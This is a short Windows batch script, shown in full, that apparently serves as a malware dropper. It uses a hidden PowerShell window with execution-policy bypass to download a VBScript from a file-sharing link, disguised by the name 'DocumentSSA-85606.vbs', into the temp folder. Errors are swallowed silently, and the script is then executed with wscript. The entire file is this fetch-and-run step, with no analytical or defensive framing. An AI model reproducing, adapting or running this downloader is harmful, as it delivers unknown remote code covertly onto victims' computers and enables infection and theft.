@echo off
set url=https://store3.gofile.io/download/direct/241274e7-7436-443e-9cbe-dbfb83771e62/DocumentSSA-85606.vbs
set file=%temp%\script.vbs

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try {Invoke-WebRequest -Uri '%url%' -OutFile '%file%' -UseBasicParsing} catch {}"

if exist "%file%" (
    wscript "%file%"
)